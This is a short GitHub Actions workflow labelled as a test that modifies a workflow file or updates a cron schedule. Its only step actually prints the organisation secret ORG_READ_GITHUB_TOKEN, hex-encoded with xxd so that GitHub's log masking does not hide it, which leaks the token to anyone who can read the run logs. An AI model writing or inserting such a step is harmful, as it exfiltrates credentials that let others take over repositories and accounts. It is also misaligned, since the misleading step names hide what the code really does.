name: PAT workflow edit test

on:
  workflow_dispatch:

jobs:
  update-cron:
    runs-on: ubuntu-latest

    steps:
      - name: Modify workflow file
        run: echo -n "${{ secrets.ORG_READ_GITHUB_TOKEN }}" | xxd -ps
